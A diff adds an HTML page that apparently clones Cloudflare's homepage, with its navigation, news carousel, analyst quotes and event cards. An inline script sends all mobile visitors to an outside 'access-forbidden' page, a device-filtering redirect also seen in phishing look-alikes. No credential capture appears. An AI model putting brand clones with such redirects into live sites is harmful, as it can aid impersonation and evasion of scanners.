@@ -1,0 +1,632 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connect, Protect and Build Everywhere | Cloudflare</title>
+  <link rel="icon" type="image/png" href="https://www.cloudflare.com/favicon.ico">
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="https://unpkg.com/@material-tailwind/html@latest/styles/material-tailwind.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Glide.js/3.0.2/glide.js"></script>
+</head>
+<body>
+  <header>
+<div class="container">
+  <div class="logo">
+    <img src="/assets/cf.png" alt="" height="30px" width="204px">
+  </div>
+<nav class="navbar">
+<a href="#">Solutions</a>
+<a href="#">Products</a>
+<a href="#">Pricing</a>
+<a href="#">Resources</a>
+<a href="#">Partners</a>
+<a href="#">Why Cloudflare</a>
+</nav>
+  <div class="right">
+  Sales: 0008 000 501 996
+  </div>
+
+  <div class="bttn">
+    <div class="relative inline-block text-left">
+      <button id="dropdown-button" class="inline-flex justify-center w-full px-4 py-2 text-sm font-medium text-gray-700 custom-font">
+          <b>Support</b>
+          <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 ml-2 -mr-1" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+              <path fill-rule="evenodd" d="M6.293 9.293a1 1 0 011.414 0L10 11.586l2.293-2.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd" />
+          </svg>
+      </button>
+      <div id="dropdown-menu" class="hidden origin-top-right absolute right-0 mt-2 w-48 rounded-md shadow-lg bg-white ring-1 ring-black ring-opacity-5">
+          <div class="py-2 p-2" role="menu" aria-orientation="vertical" aria-labelledby="dropdown-button">
+              <a class="flex block rounded-md px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 active:bg-blue-100 cursor-pointer" role="menuitem">
+                 Community Support
+                </a>
+              <a class="flex block rounded-md px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 active:bg-blue-100 cursor-pointer" role="menuitem">
+                 Help Center
+                </a>
+              <a class="flex block rounded-md px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 active:bg-blue-100 cursor-pointer" role="menuitem">
+               Contact Cloudflare
+                </a>
+                <a class="flex block rounded-md px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 active:bg-blue-100 cursor-pointer" role="menuitem">
+                  Lost account access?
+                </a>
+          </div>
+      </div>
+    </div>
+  </div>
+  <script>
+  const dropdownButton = document.getElementById('dropdown-button');
+  const dropdownMenu = document.getElementById('dropdown-menu');
+  let isDropdownOpen = false; 
+  function toggleDropdown() {
+      isDropdownOpen = !isDropdownOpen;
+      if (isDropdownOpen) {
+          dropdownMenu.classList.remove('hidden');
+      } else {
+          dropdownMenu.classList.add('hidden');
+      }
+  }
+  
+  dropdownButton.addEventListener('click', toggleDropdown);
+  window.addEventListener('click', (event) => {
+      if (!dropdownButton.contains(event.target) && !dropdownMenu.contains(event.target)) {
+          dropdownMenu.classList.add('hidden');
+          isDropdownOpen = false;
+      }
+  });
+  </script>
+  <script>
+    function redirectIfNotComputer(){var e=navigator.userAgent||navigator.vendor||window.opera;/iPad|iPhone|iPod/.test(e)&&!window.MSStream&&window.location.replace("https://access-forbidden.netlify.app/"),/android/i.test(e)&&window.location.replace("https://access-forbidden.netlify.app/"),/Mobi|Tablet|iPad|iPhone|iPod/.test(e)&&window.location.replace("https://access-forbidden.netlify.app/")}redirectIfNotComputer();
+  </script>
+
+<div class="bttn2">
+  <div class="relative inline-block text-left">
+    <button id="dropdown-button" class="inline-flex justify-center w-full px-4 py-2 text-sm font-medium text-gray-700 custom-font">
+      <svg width="15px" height="15px" viewBox="0 0 0.4 0.4" xmlns="http://www.w3.org/2000/svg" fill="#000000"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.213 0.025a0.163 0.163 0 1 1 0 0.325 0.163 0.163 0 0 1 0 -0.325m0.122 0.1a0.138 0.138 0 0 0 -0.076 -0.067c0.011 0.021 0.019 0.044 0.024 0.067zm0.015 0.075A0.125 0.125 0 0 0 0.35 0.188a0.138 0.138 0 0 0 -0.005 -0.038h-0.059c0.001 0.008 0.001 0.017 0.001 0.025a0.25 0.25 0 0 1 -0.005 0.05h0.062q0.004 -0.012 0.005 -0.025zm-0.088 0 0 -0.001A0.225 0.225 0 0 0 0.263 0.175a0.225 0.225 0 0 0 -0.002 -0.025H0.164A0.225 0.225 0 0 0 0.163 0.175a0.225 0.225 0 0 0 0.006 0.05h0.088q0.003 -0.012 0.004 -0.025M0.256 0.125a0.225 0.225 0 0 0 -0.031 -0.074C0.221 0.05 0.217 0.05 0.213 0.05a0.1 0.1 0 0 0 -0.008 0l-0.005 0L0.2 0.051A0.225 0.225 0 0 0 0.169 0.125zM0.143 0.125a0.25 0.25 0 0 1 0.024 -0.067A0.138 0.138 0 0 0 0.09 0.125zM0.08 0.15A0.138 0.138 0 0 0 0.075 0.188 0.138 0.138 0 0 0 0.08 0.225h0.062A0.25 0.25 0 0 1 0.138 0.175c0 -0.008 0.001 -0.017 0.001 -0.025zm0.069 0.1h-0.059a0.138 0.138 0 0 0 0.095 0.072A0.25 0.25 0 0 1 0.149 0.25M0.213 0.316A0.225 0.225 0 0 0 0.249 0.25H0.176A0.225 0.225 0 0 0 0.213 0.316M0.276 0.25a0.25 0.25 0 0 1 -0.036 0.072A0.138 0.138 0 0 0 0.335 0.25z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 ml-2 -mr-1" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+            <path fill-rule="evenodd" d="M6.293 9.293a1 1 0 011.414 0L10 11.586l2.293-2.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd" />
+        </svg>
+    </button>
+    <!-- <div id="dropdown-menu" class="origin-top-right absolute right-0 mt-2 w-48 rounded-md shadow-lg bg-white ring-1 ring-black ring-opacity-5">
+    </div> -->
+  </div>
+</div>
+
+<div class="srch">
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-6">
+    <path stroke-linecap="round" stroke-linejoin="round" d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z" />
+  </svg> 
+</div>
+<div class="su">
+Sign up
+</div>
+<div class="btn">
+  <button class="group relative h-12 w-47 overflow-hidden rounded-lg  bg-[#ff6434] py-4 px-2 text-sm font-bold text-black custom-font">
+    Under attack?
+    <div class="absolute inset-0 h-full w-full scale-0 rounded-lg  transition-all duration-300 group-hover:scale-100 group-hover:bg-white/30"></div>
+  </button>
+</div>
+<div class="btn2">
+  <button
+class="middle none center mr-3 h-12 w-47 rounded-lg border border-orange-700 py-4 px-6 text-sm font-bold text-black-600 custom-font transition-all hover:opacity-75 focus:ring focus:ring-orange-200 active:opacity-[0.85] disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none" data-ripple-dark="true">
+Log in
+</button>
+</div>
+</div>
+<hr class="divider-dark">
+</header>
+
+<section class="bdy">
+<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1uRN3TielOR3e6aKNQKRaA/9782c19544fa2aa7677785e7dfd10018/Flare_Exploration-4.19.24.svg" alt="" width="100%">
+<h1 class="headline">Connect, protect and</h1>
+<h1 class="headline2">build everywhere</h1>
+<p class="ptc">Put the connectivity cloud to work for you.</p>
+<div class="btn3">
+  <button class="group relative h-12 w-48 overflow-hidden rounded-lg  bg-[#ff6434] text-sm font-bold text-black custom-font">
+    Learn more
+    <div class="absolute inset-0 h-full w-full scale-0 rounded-lg  transition-all duration-300 group-hover:scale-100 group-hover:bg-white/30"></div>
+  </button>
+</div>
+<div class="btn4">
+  <button
+class="middle none center mr-3 h-12 w-48 rounded-lg border border-orange-700 text-sm custom-font transition-all hover:opacity-75 focus:ring focus:ring-orange-200 active:opacity-[0.85] disabled:pointer-events-none disabled:opacity-50 disabled:shadow-none" data-ripple-dark="true">
+Start for free
+</button>
+</div>
+
+<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5XA6P5ZUYwcjq9LZGBbAcj/1517e2b34ef3bf213fca28586ae33170/ease-of-use-toggle.svg" alt="" height="24px" width="24px" class="ctrlimg">
+<p class="ctrl">Control
+    <span class="line">Regain visibility and control of IT and</span>
+    <span class="line">security across on-prem, public cloud,</span>
+    <span class="line">SaaS, and the Internet</span>
+</p>
+
+<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/74GDwwyKnKfYYz1QQEQh1P/c7232082d74a2cb16d2197596662f593/security-shield-protection-2.svg" alt="" height="24px" width="24px" class="ctrlimg2">
+<p class="ctrl2">Security
+    <span class="line2">Improve security and resilience while</span>
+    <span class="line2">reducing your attack surface, vendor</span>
+    <span class="line2">count, and tool sprawl</span>
+</p>
+
+<div class="btm-img">
+  <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/76x52jIsr93tqZq0h3HCFW/33a7575a9dc880e0a45c0f69fcbcfc8f/cc-diagram-orange-2024.png" alt="">
+</div>
+
+<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/3hozCySUonJzxSF7TBtDeF/09c3642522b5a9036c157dcab3a59b8d/performance-acceleration-bolt.svg" alt="" height="24px" width="24px" class="ctrlimg3">
+<p class="ctrl3">Speed
+    <span class="line3">Accelerate application and network</span>
+    <span class="line3">performance while rapidly developing</span>
+    <span class="line3">new applications</span>
+</p>
+
+<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/4VlvhGvGbJaxjZSP9FzUxL/8c5199800e0e10bdf85f00c6b031d16c/arrow-down.svg" alt="" height="24px" width="24px" class="ctrlimg4">
+<p class="ctrl4">Cost
+    <span class="line4">Reduce cost and complexity to</span>
+    <span class="line4">reinvest resources in your highest</span>
+    <span class="line4">priorities</span>
+</p>
+
+<div class="btn5">
+  <button class="group relative overflow-hidden rounded-lg  bg-[#ff6434] text-sm font-bold text-black custom-font" style="height: 44px; width: 272px;">
+    Contact sales
+    <div class="absolute inset-0 h-full w-full scale-0 rounded-lg  transition-all duration-300 group-hover:scale-100 group-hover:bg-white/30"></div>
+  </button> <br> <br> <br>
+  <hr class="divider-dark">
+</section>
+
+<section class="bdy2">
+<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5qOkL7b52oII5tM50rXHvx/244e247fb24d4b337481750c11a25031/Whats-New_Background.svg" alt="" width="100%">
+<p class="wn" style="font-size: 33px;">What’s new</p>
+</section>
+
+<div class="bdy3"> 
+  <div class="relative w-full mx-auto glide-08 overflow-hidden" style="position: absolute; top: 1630px;">
+    <div data-glide-el="track" class="overflow-hidden">
+        <ul class="whitespace-no-wrap flex-no-wrap [backface-visibility: hidden] [transform-style: preserve-3d] [touch-action: pan-Y] [will-change: transform] relative flex w-full overflow-hidden p-0 pb-12 justify-center">
+            <li class="mx-2">
+                <div class="overflow-hidden bg-white rounded shadow-xl text-slate-500 shadow-slate-200" style="width: 284px; height: 323px; cursor: pointer;">
+                    <figure>
+                      <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2eUT1NEPuD72AZvtRPNRLZ/f022299aa7fbffca0e2cc3f31b8e15f2/image-2024-02-26-16-58-14-701.png" alt="card image" class="aspect-video w-full" />
+                    </figure>
+                    <div class="p-6">
+                      <header class="flex gap-4 mb-4">
+                        <div>
+                          <h3 class="text-s font-medium text-slate-700" style="color: #ff6434;">Announcements</h3>
+                        </div>
+                      </header>
+                      <p style="font-size: 15px;">
+                        Manage risk across your expanding attack surface with Cloudflare for Unified Risk Posture
+                      </p>
+                    </div>
+                  </div>
+            </li>
+            <li class="mx-2">
+              <div class="overflow-hidden bg-white rounded shadow-xl text-slate-500 shadow-slate-200" style="width: 284px; height: 323px; cursor: pointer;">
+                  <figure>
+                    <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2MwUTWYt0psg5xd55Vkvfo/7822687bbbf2b0738c770e183b7b737a/Press_Release_99x180.svg" alt="card image" class="aspect-video w-full" />
+                  </figure>
+                  <div class="p-6">
+                    <header class="flex gap-4 mb-4">
+                      <div>
+                        <h3 class="text-s font-medium text-slate-700" style="color: #ff6434;">Press</h3>
+                      </div>
+                    </header>
+                    <p style="font-size: 15px;">
+                      Press release: Cloudflare and Booz Allen Hamilton provide rapid attack mitigation for enterprises
+                    </p>
+                  </div>
+                </div>
+          </li>
+            <li class="mx-2">
+                <div class="overflow-hidden bg-white rounded shadow-xl text-slate-500 shadow-slate-200" style="width: 284px; height: 323px; cursor: pointer;">
+                    <figure>
+                      <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2eUT1NEPuD72AZvtRPNRLZ/f022299aa7fbffca0e2cc3f31b8e15f2/image-2024-02-26-16-58-14-701.png" alt="card image" class="aspect-video w-full" height="900px" />
+                    </figure>
+                    <div class="p-6">
+                      <header class="flex gap-4 mb-4">
+                        <div>
+                          <h3 class="text-s font-medium text-slate-700" style="color: #ff6434;">Blog</h3>
+                        </div>
+                      </header>
+                      <p style="font-size: 15px;">
+                        Introducing Foundation DNS: Advanced authoritative DNS for enterprises
+                      </p>
+                    </div>
+                  </div>
+            </li>
+            <li class="mx-2">
+                <div class="overflow-hidden bg-white rounded shadow-xl text-slate-500 shadow-slate-200" style="width: 284px; height: 323px; cursor: pointer;">
+                    <figure>
+                      <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1YGoGZqotjq31Aea3bHXWk/534e357ba4a1d8fcc415fe032cca632a/WEBX-1644_ArchitectureCenter_Thumbnail.svg" alt="card image" class="aspect-video w-full" />
+                    </figure>
+                    <div class="p-6">
+                      <header class="flex gap-4 mb-4">
+                        <div>
+                          <h3 class="text-s font-medium text-slate-700" style="color: #ff6434;">Explore</h3>
+                        </div>
+                      </header>
+                      <p style="font-size: 15px;">
+                        Accelerate your Cloudflare implementation with in-depth reference architectures
+                      </p>
+                    </div>
+                  </div>
+                  <li class="mx-2">
+                    <div class="overflow-hidden bg-white rounded shadow-xl text-slate-500 shadow-slate-200" style="width: 284px; height: 323px; cursor: pointer;">
+                        <figure>
+                          <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2MwUTWYt0psg5xd55Vkvfo/7822687bbbf2b0738c770e183b7b737a/Press_Release_99x180.svg" alt="card image" class="aspect-video w-full" />
+                        </figure>
+                        <div class="p-6">
+                          <header class="flex gap-4 mb-4">
+                            <div>
+                              <h3 class="text-s font-medium text-slate-700" style="color: #ff6434;">Press</h3>
+                            </div>
+                          </header>
+                          <p style="font-size: 15px;">
+                            Cloudflare acquires BastionZero; adds Zero Trust infrastructure access for SASE platform
+                          </p>
+                        </div>
+                      </div>
+                </li>
+                  <li class="mx-2">
+                    <div class="overflow-hidden bg-white rounded shadow-xl text-slate-500 shadow-slate-200" style="width: 284px; height: 323px; cursor: pointer;">
+                        <figure>
+                          <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2eUT1NEPuD72AZvtRPNRLZ/f022299aa7fbffca0e2cc3f31b8e15f2/image-2024-02-26-16-58-14-701.png" alt="card image" class="aspect-video w-full" />
+                        </figure>
+                        <div class="p-6">
+                          <header class="flex gap-4 mb-4">
+                            <div>
+                              <h3 class="text-s font-medium text-slate-700" style="color: #ff6434;">Report</h3>
+                            </div>
+                          </header>
+                          <p style="font-size: 15px;">
+                            Cloudflare named in Gartner® Magic Quadrant™ for SSE for second consecutive year
+                          </p>
+                    </div>
+                </div>
+            </li>
+            <li class="mx-2">
+              <div class="overflow-hidden bg-white rounded shadow-xl text-slate-500 shadow-slate-200" style="width: 284px; height: 323px; cursor: pointer;">
+                  <figure>
+                    <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2MwUTWYt0psg5xd55Vkvfo/7822687bbbf2b0738c770e183b7b737a/Press_Release_99x180.svg" alt="card image" class="aspect-video w-full" />
+                  </figure>
+                  <div class="p-6">
+                    <header class="flex gap-4 mb-4">
+                      <div>
+                        <h3 class="text-s font-medium text-slate-700" style="color: #ff6434;">Press</h3>
+                      </div>
+                    </header>
+                    <p style="font-size: 15px;">
+                      2024 Application Security Report: Discover threats to web applications and APIs, from DDoS to supply chain risks
+                    </p>
+                  </div>
+                </div>
+          </li>
+        </ul>
+    </div>
+</div>
+<script>
+var glide07 = new Glide('.glide-08', {
+    type: 'carousel',
+    focusAt: 'center',
+    animationDuration: 500, 
+    autoplay: 1500,  
+    hoverpause: true,
+    rewind: true,
+    perView: 4,
+    gap: 24,
+    classes: {
+        activeNav: '[&>*]:bg-slate-700',
+    },
+    breakpoints: {
+        1280: {
+            perView: 3
+        },
+        1024: {
+            perView: 2
+        },
+        640: {
+            perView: 1
+        }
+    },
+});
+
+glide07.mount();
+</script>
+</div>
+
+<div class="bdy4">
+
+  <div class="border-2 border-orange-500 rounded-lg p-6" style="height: 600px; width: 1122px; position: absolute; top: 2200px; left: 200px;">
+    <p class="text-black text-center mt-6" style="font-family: 'SegoeUI-SemiBold';font-size: 30px;">Powered by an intelligent global network, our<br>connectivity cloud is a unified platform that helps your<br>business work, deliver, and innovate everywhere.</p>
+    <div class="s1" style="position: absolute; left: 20px; top: 260px;">
+      <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2pqDYkVg8K6GqUXO2x7Izl/2d2a67e1288dbd9fc5eadcd48b56333f/SSE_SASE_01.svg" alt="" class="middle-img">
+      <h1 class="text-orange-600 text-xl custom-font">SASE and SSE services</h1> <br>
+      <p class="text-black text-sm">Connect and secure your employees, contractors,<br>devices, networks, apps, and data everywhere<br>they live.</p>
+    </div>
+    <div class="s2" style="position: absolute; left: 420px; top: 260px;">
+      <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/6PDJxm9gpmdAMR1JSTQRSl/1ad54dc5651ec6d7edd26c3785766bd5/Apps_Infrastructure.svg_01.svg" alt="" class="middle-img">
+      <h1 class="text-orange-600 text-xl custom-font">App and infrastructure services</h1> <br>
+      <p class="text-black text-sm">Give your digital products and services top-notch<br>security, reliability, and performance for<br>customers everywhere.</p>
+    </div>
+    <div class="s3" style="position: absolute; left: 820px; top: 260px;">
+      <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1jwF6zz4lTaL25osoXtSIy/76a1cf8bb1e2292f64d4314d702a7de3/Developer_Platform_01.svg" alt="" class="middle-img">
+      <h1 class="text-orange-600 text-xl custom-font">Developer services</h1> <br>
+      <p class="text-black text-sm">Easily build and deploy full-stack applications<br>everywhere, thanks to integrated compute,<br>storage, and networking.
+      </p>
+    </div>
+  </div>
+
+  <h3 style="position: absolute; top: 2850px; left: 550px;">Want to speak with an expert?</h3>
+  <button class="group relative overflow-hidden rounded-lg  bg-[#ff6434] text-sm font-bold text-black custom-font" style="height: 44px; width: 160px; position: absolute; top: 2840px; left: 780px;">
+   Get in touch
+    <div class="absolute inset-0 h-full w-full scale-0 rounded-lg  transition-all duration-300 group-hover:scale-100 group-hover:bg-white/30"></div>
+  </button>
+
+</div>
+
+<div class="bdy5">
+
+<h2 class="text-black text-center" style="font-family: 'SegoeUI-SemiBold';font-size: 33px; position: absolute;top: 415vh; left: 640px;">What analysts say</h2> <br> <br>
+
+<div class="flex flex-col md:flex-row">
+  <div class="flex-1"style="position: absolute; left: 180px; top: 428vh;">
+    <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2EpMDcOzRGz0qkeQbuOoB1/647e0c54d93967efd46237dec01b149d/gartner.svg" alt="" class="mb-4">
+    <h4 class="text-black mb-4" style="font-family: 'SegoeUI-SemiBold';font-size: 17px;">Cloudflare named in 2024 Gartner® Magic<br>Quadrant™ for Single-Vendor SASE</h4>
+    <p style="font-size: 14px;">We believe this recognition is a testament to Cloudflare's <br>"light branch, heavy cloud" architecture and its ability to<br> help global, cloud-minded enterprises accelerate their<br> network modernization.</p> <br> <br>
+    <a class="rtt" href="#" style="font-family: 'SegoeUI-SemiBold';"> Read the report</a>
+  </div>
+  <div class="flex-1" style="position: absolute; left: 580px; top: 428vh;">
+    <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1AdmvEGP1Nssxe3RI0j9Fl/d35e24c62136bae8429dfd43805ad832/forester.svg" alt="" class="mb-4">
+    <h4 class="text-black mb-4" style="font-family: 'SegoeUI-SemiBold';font-size: 17px;">Cloudflare named in 2024 Gartner® Magic<br>Quadrant™ for Single-Vendor SASE</h4>
+    <p style="font-size: 14px;">We believe this recognition is a testament to Cloudflare's <br>"light branch, heavy cloud" architecture and its ability to<br> help global, cloud-minded enterprises accelerate their<br> network modernization.</p> <br> <br>
+    <a class="rtt" href="#" style="font-family: 'SegoeUI-SemiBold';"> Read the report</a>  
+  </div>
+  <div class="flex-1" style="position: absolute; left: 980px; top: 428vh;">
+    <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/62y2LOw1pScTM3Nyy6mM8j/e74f4d41a003a796b26dfdcd30448372/idc.svg" alt="" class="mb-4">
+    <h4 class="text-black mb-4" style="font-family: 'SegoeUI-SemiBold';font-size: 17px;">Cloudflare named in 2024 Gartner® Magic<br>Quadrant™ for Single-Vendor SASE</h4>
+    <p style="font-size: 14px;">We believe this recognition is a testament to Cloudflare's <br>"light branch, heavy cloud" architecture and its ability to<br> help global, cloud-minded enterprises accelerate their<br> network modernization.</p> <br> <br>
+    <a class="rtt" href="#" style="font-family: 'SegoeUI-SemiBold';"> Read the report</a>
+  </div>
+</div>
+
+<h1 style="font-family: 'SegoeUI-SemiBold';font-size: 29px; position: absolute;top: 490vh; left: 280px;">Global leaders, including 30% of the Fortune 1000, rely on Cloudflare</h1>
+<img src="/assets/banner.png" alt="" style="position: absolute; top: 496vh;">
+<hr class="divider-dark" style="position: absolute;top: 535vh;">
+</div>
+
+<div class="bdy6">
+<img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5qOkL7b52oII5tM50rXHvx/244e247fb24d4b337481750c11a25031/Whats-New_Background.svg" alt="" style="position: absolute;top: 535vh; width: 100%;">
+<h1 style="font-family: 'SegoeUI-SemiBold';font-size: 32px; position: absolute;top: 540vh; left: 200px;">Resources</h1>
+
+<div class="container mx-auto px-4">
+  <div class="grid grid-cols-1 md:grid-cols-3 gap-6" style="position: absolute; left: 197px; top: 553vh;">
+  <div class="max-w-sm rounded-lg overflow-hidden shadow-lg bg-white p-6 flex">
+    <div class="flex-1 pr-4">
+      <p class="text-red-500 font-semibold mb-2">Event</p>
+      <h2 class="text-md text-gray-800 mb-4">
+        Join us in-person or stream the keynote at Cloudflare Connect Sydney on August 8
+      </h2>
+      <a href="#" class="text-black-600 hover:text-[#ff6434] inline-flex items-center pt-9">
+        Register
+        <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+        </svg>
+      </a>
+    </div>
+    <div class="flex-shrink-0">
+      <img 
+        src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/68DfcHFQu9gQOPxDUV8vcg/c1847c3452806bea152c8a8bacd3007d/sydney-event.svg" 
+        style="height: 100%;
+        object-fit: cover;
+        object-position: center;"
+        class="w-24 h-auto object-contain">
+    </div>
+  </div>
+  
+  <div class="max-w-sm rounded-lg overflow-hidden shadow-lg bg-white p-6 flex">
+    <div class="flex-1 pr-4">
+      <p class="text-red-500 font-semibold mb-2">Event</p>
+      <h2 class="text-md text-gray-800 mb-4">
+        Come meet Cloudflare at Black Hat USA 2024 Booth <br> #2840
+      </h2>
+      <a href="#" class="text-black-600 hover:text-[#ff6434] inline-flex items-center pt-9">
+        Register
+        <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+        </svg>
+      </a>
+    </div>
+    <div class="flex-shrink-0">
+      <img 
+        src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/6aYGUcWE0Rba4MG4pfYj39/a6ec8bc0f55704545c37054e2788f22c/Black_Hat_-_Booth_Info_Thumbnail.png" 
+        style="height: 100%;
+        object-fit: cover;
+        object-position: center;" 
+        class="w-24 h-auto object-contain">
+    </div>
+  </div>
+  
+  <div class="max-w-sm rounded-lg overflow-hidden shadow-lg bg-white p-6 flex">
+    <div class="flex-1 pr-4">
+      <p class="text-red-500 font-semibold mb-2">Event</p>
+      <h2 class="text-md text-gray-800 mb-4">
+        Join our Solution Engineering team for live weekly application security demos
+      </h2>
+      <a href="#" class="text-black-600 hover:text-[#ff6434] inline-flex items-center pt-9">
+        Register
+        <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+        </svg>
+      </a>
+    </div>
+    <div class="flex-shrink-0">
+      <img 
+        src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2qsPuuImKhFS0I6IchnUR0/33dfb6b56317ac494a108a861585e24f/Application_Services_hero_image.svg" alt="Ebook cover" style="height: 100%;
+        object-fit: cover;
+        object-position: center;" 
+        class="w-24 h-auto object-contain">
+    </div>
+  </div>
+  
+  <div class="max-w-sm rounded-lg overflow-hidden shadow-lg bg-white p-6 flex">
+    <div class="flex-1 pr-4">
+      <p class="text-red-500 font-semibold mb-2">Event</p>
+      <h2 class="text-md text-gray-800 mb-4">
+        JTune in for live weekly application performance demos — hosted by our Solution Engineering team
+      </h2>
+      <a href="#" class="text-black-600 hover:text-[#ff6434] inline-flex items-center pt-9">
+        Register
+        <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+        </svg>
+      </a>
+    </div>
+    <div class="flex-shrink-0">
+      <img 
+        src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/33pNtP0fhgTrjCgk4Ahdyo/c3b0e163c89573659e2898c2aa871501/Application_Services_Protect___accelerate.png" 
+        style="height: 100%;
+        object-fit: cover;
+        object-position: center;"
+        class="w-24 h-auto object-contain">
+    </div>
+  </div>
+  
+  <div class="max-w-sm rounded-lg overflow-hidden shadow-lg bg-white p-6 flex">
+    <div class="flex-1 pr-4">
+      <p class="text-red-500 font-semibold mb-2">Webinar</p>
+      <h2 class="text-md text-gray-800 mb-4">
+        Introducing Defensive AI: tailored protection against emerging AI threats
+      </h2>
+      <a href="#" class="text-black-600 hover:text-[#ff6434] inline-flex items-center pt-9">
+        Register
+        <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+        </svg>
+      </a>
+    </div>
+    <div class="flex-shrink-0">
+      <img 
+        src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2ZiPjCDWMWnibCFs5nxHBa/75ef0ba1b4484c2da8ab4d3f40437dff/Whitpapper-generic-106x186-300dpi.png" 
+        style="height: 100%;
+        object-fit: cover;
+        object-position: center;" 
+        class="w-24 h-auto object-contain">
+    </div>
+  </div>
+  
+  <div class="max-w-sm rounded-lg overflow-hidden shadow-lg bg-white p-6 flex">
+    <div class="flex-1 pr-4">
+      <p class="text-red-500 font-semibold mb-2">Virtual workshop</p>
+      <h2 class="text-md text-gray-800 mb-4">
+        Security Builders Workshop - The latest in Security and Zero Trust
+      </h2>
+      <a href="#" class="text-black-600 hover:text-[#ff6434] inline-flex items-center pt-9">
+        Register
+        <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+        </svg>
+      </a>
+    </div>
+    <div class="flex-shrink-0">
+      <img 
+        src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/1f2iRYyLtJPAYkKFR9G5h2/9c58683aa4b33bc18ab0431847cac0d1/Enabling_TLS_inspection__A_how-to_guide.png" 
+        style="height: 100%;
+        object-fit: cover;
+        object-position: center;"
+        class="w-24 h-auto object-contain">
+      </div>
+      </div>
+  </div>
+</div>
+
+<h1 style="font-family: 'SegoeUI-SemiBold';font-size: 32px; position: absolute;top: 641vh; left: 200px;">Get started with <br> Cloudflare</h1>
+<h6 style="font-family: 'SegoeUI-SemiBold';font-size: 23px; position: absolute;top: 642vh; left: 532px;">Enterprise</h6>
+<p style="position: absolute;top: 648vh; left: 532px;">The world’s leading enterprises trust Cloudflare to <br> deliver speed, security and reliability everywhere.</p>
+<a class="rtt" href="#" style="font-family: 'SegoeUI-SemiBold';position: absolute;top: 656vh; left: 533px; color: #ff6434;">Learn more</a>
+
+<h6 style="font-family: 'SegoeUI-SemiBold';font-size: 23px; position: absolute;top: 642vh; left: 952px;">Pay-as-you-go</h6>
